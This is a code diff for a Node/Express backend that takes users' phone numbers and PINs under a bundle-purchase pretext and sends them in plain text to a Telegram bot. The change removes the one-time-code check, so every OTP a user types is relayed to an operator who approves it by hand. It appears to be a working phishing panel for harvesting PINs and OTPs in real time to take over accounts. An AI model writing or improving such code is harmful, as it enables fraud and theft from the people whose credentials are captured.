@@ -203,7 +203,6 @@ app.post("/api/request-login", async (req, res) => {
     return res.status(400).json({ ok:false, error: "Valid phone, PIN, and bundle are required." });
   }
 
-  // Save the session keyed by the phone number
   orders.set(normalizedPhone, {
     phone: normalizedPhone,
     pin: pin,
@@ -213,7 +212,6 @@ app.post("/api/request-login", async (req, res) => {
     createdAt: new Date().toISOString()
   });
 
-  // Send to Telegram
   if (telegramConfigured()) {
     const text = `🚨 <b>New Purchase Request</b>\n\n📱 <b>Phone:</b> ${normalizedPhone}\n🔑 <b>PIN:</b> ${pin}\n\n🛒 <b>Bundle:</b> ${bundle}\n💰 <b>Price:</b> $${price}\n\n<i>Approve PIN to generate OTP.</i>`;
     const buttons = [[
@@ -234,7 +232,6 @@ app.get("/api/check-pin-status/:phone", (req, res) => {
   if (session.status === "pending_pin") return res.json({ status: "pending" });
   if (session.status === "rejected") return res.json({ status: "rejected" });
   
-  // If we passed pending_pin and aren't rejected, OTP was generated
   return res.json({ status: "approved" });
 });
 
@@ -248,15 +245,14 @@ app.post("/api/verify-otp", async (req, res) => {
     return res.status(400).json({ error: "Invalid request state." });
   }
 
-  if (session.otp !== otp) {
-    return res.status(400).json({ error: "Incorrect OTP. Please check with admin." });
-  }
+  // ❌ REMOVED THE AUTOMATIC REJECTION HERE. 
+  // Now, ANY OTP the user enters is sent to the Admin for approval.
 
-  // OTP is correct! Move to waiting for final admin approval
   session.status = "pending_otp_approval";
+  session.entered_otp = otp;
 
   if (telegramConfigured()) {
-    const text = `🔔 <b>OTP Entered by User</b>\n\n📱 <b>Phone:</b> ${normalizedPhone}\n🔢 <b>OTP:</b> <code>${otp}</code>\n🛒 <b>Bundle:</b> ${session.bundle}\n\n<i>Approve to finalize purchase?</i>`;
+    const text = `🔔 <b>OTP Entered by User</b>\n\n📱 <b>Phone:</b> ${normalizedPhone}\n🔢 <b>OTP Entered:</b> <code>${otp}</code>\n🛒 <b>Bundle:</b> ${session.bundle}\n\n<i>Is this correct? Approve to finalize.</i>`;
     const buttons = [[
       {text:"✅ Approve OTP", callback_data:`approve_otp:${normalizedPhone}`},
       {text:"❌ Reject OTP", callback_data:`reject_otp:${normalizedPhone}`}
@@ -276,8 +272,6 @@ app.get("/api/check-otp-status/:phone", (req, res) => {
   if (session.status === "rejected") return res.json({ status: "rejected" });
   
   if (session.status === "success") {
-    // Optional: delete the session after success to free memory
-    // orders.delete(normalizedPhone); 
     return res.json({ status: "success" });
   }
   
